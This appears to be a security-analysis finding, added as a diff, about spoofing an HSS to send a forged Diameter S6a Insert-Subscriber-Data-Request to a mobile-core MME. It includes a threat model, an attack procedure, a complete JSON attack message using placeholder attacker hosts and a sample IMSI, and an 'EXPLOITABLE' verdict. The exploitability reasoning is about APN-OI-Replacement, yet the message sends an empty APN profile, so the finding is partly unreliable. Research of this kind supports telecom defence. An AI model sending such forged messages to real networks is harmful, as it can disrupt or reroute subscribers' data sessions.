@@ -1,0 +1,50 @@
+### **Threat Model:**
+- **Attack Assumption:**
+  - The victim is the **MME** on **S6a**, and the attacker impersonates the **HSS** to send a forged `Insert-Subscriber-Data-Request (IDR)` directly to that MME. The MME accepts the request as authoritative subscriber-provisioning input and updates the targeted UE's cached subscription profile, including APN configuration data.
+- **Attacker Capability:**
+  - The attacker can open its own Diameter connection to the exposed MME, send crafted **IDR Requests**, and receive the corresponding Answers. The attacker knows the target subscriber identity (for example the IMSI in `User-Name`), but does **not** control legitimate HSS links, radio procedures, GTP/NAS signaling, or downstream PGW infrastructure beyond what the forged subscriber data itself can influence.
+
+### **Exploitability Analysis:**
+- `Subscription-Data.APN-Configuration-Profile.APN-Configuration.APN-OI-Replacement` is not mere metadata; it is an **authoritative 3GPP subscriber-profile leaf** inside the HSS-provided APN configuration that the MME stores for the UE. It is optional, vendor-specific (`Vendor-Id 10415`), string-like (`OctetString`) data, but when present it directly affects how the MME later derives or validates the **operator identifier portion** of a full APN for that specific `APN-Configuration` instance.
+
+### **Attack Procedure:**
+- Craft a forged S6a `Insert-Subscriber-Data-Request` from the spoofed HSS identity to the target MME, including the target subscriber `User-Name`, standard request AVPs, and a `Subscription-Data` subtree containing Null `APN-Configuration-Profile`.
+- The expected success condition is that the MME returns a successful IDA, and on the subscriber's next attach or PDN connectivity procedure the resulting APN is altered, causing session failure or different APN routing behavior.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 319,
+    "application_id": 16777251,
+    "request": true,
+    "proxiable": true,
+    "vendor_specific": false
+  },
+  "avps": [
+    { "name": "Session-Id", "value": "attacker-hss.example;1234567890;1" },
+    { "name": "Auth-Session-State", "value": 1 },
+    { "name": "Origin-Host", "value": "hss.attacker.example" },
+    { "name": "Origin-Realm", "value": "attacker.example" },
+    { "name": "Destination-Host", "value": "mme01.epc.example.net" },
+    { "name": "Destination-Realm", "value": "epc.example.net" },
+    { "name": "Vendor-Specific-Application-Id",
+      "value": {
+        "Vendor-Id": 10415,
+        "Auth-Application-Id": 16777251
+      }
+    },
+    { "name": "User-Name", "value": "001010123456789" },
+    { "name": "IDR-Flags", "value": 0 },
+    { "name": "Subscription-Data",
+      "value": {
+        "APN-Configuration-Profile": {
+        }
+      }
+    }
+  ]
+}
+```
+
+### **Classification:**
+- `EXPLOITABLE`
